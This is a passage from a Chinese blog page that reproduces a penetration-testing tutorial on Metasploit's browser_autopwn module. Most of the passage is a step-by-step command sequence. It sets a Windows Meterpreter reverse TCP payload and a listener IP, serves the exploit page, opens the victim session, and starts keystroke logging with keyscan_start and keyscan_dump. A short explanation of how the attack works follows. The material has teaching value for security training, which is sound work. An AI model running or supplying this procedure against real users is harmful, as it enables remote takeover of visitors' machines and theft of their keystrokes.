</code></pre> <p><img src="https://images2.imgbox.com/1e/a5/nSE1ondq_o.jpg" alt="第六章 漏洞利用 - 图30"></p> </li><li> <p>使用<code>browser_autopwn</code>模块：</p> <pre><code>Use auxiliary/server/browser_autopwn
</code></pre> </li><li> <p>设置我们的载荷，这里我们使用 Windows 反向 TCP：</p> <pre><code>set payload windows/meterpreter/reverse_tcp
</code></pre> </li><li> <p>显示可用于该载荷类型的选项。</p> <pre><code>show options
</code></pre> </li><li> <p>设置反向连接所使用的 IP。这里，该 PC 的 IP 地址为<code>192.168.10.109</code>。</p> <pre><code>set LHOST 192.168.10.109
</code></pre> </li><li> <p>下面，我们打算设置 URIPATH，这里我们使用<code>"filetypes"</code>（带引号）：</p> <pre><code>set URIPATH "filetypes"
</code></pre> </li><li> <p>最后，我们执行漏洞利用：</p> <pre><code>exploit
</code></pre> </li><li> <p>Metasploit 会在 IP 地址 处执行漏洞利用。</p> </li><li> <p>当访问者访问这个地址时，<code>browser_autopwn</code>模块尝试连接用户的机器来建立远程会话。如果成功的话，Meterpreter 会确认这个会话。使用会话命令来激活它：</p> </li></ol> 
<pre><code>```
session –I 1
```
</code></pre> 
<ol start="12"><li>为了显示我们可以使用的 Meterpreter 命令列表，输入<code>help</code>。</li></ol> 
<pre><code>```
help
```
</code></pre> 
<ol start="13"><li>会显示可用命令的列表。这里，我们启动击键顺序扫描：</li></ol> 
<pre><code>```
keyscan_start
```
</code></pre> 
<ol start="14"><li>为了得到受害者机器上的击键顺序，我们键入<code>keyscan_start</code>命令：</li></ol> 
<pre><code>```
keyscan_dump
```
</code></pre> 
<h4><a id="_786"></a>工作原理</h4> 
<p>这个秘籍中，我们使用 Metasploit 的 MSFCONSOLE 来执行 browser_autopwn 漏洞利用。我们以启动控制台并搜索所有已知的<code>autopwn</code>模块开始。在喧嚣<code>autopwn</code>模块之后，我们将载荷设置为<code>windows_reverse_tcp</code>。这允许我们在利用成功时得到返回的链接。一旦受害者访问了我们的网页，漏洞利用就成功了，我们就能得到 Meterpreter 活动会话。</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/17fe317a82bfc813e75888e9ec1a3588/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">使用sklearn严格计算AUROC和AUPRC</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/6add5c59d48902b924f1e21d3582fa19/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Eclipses安装教程</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>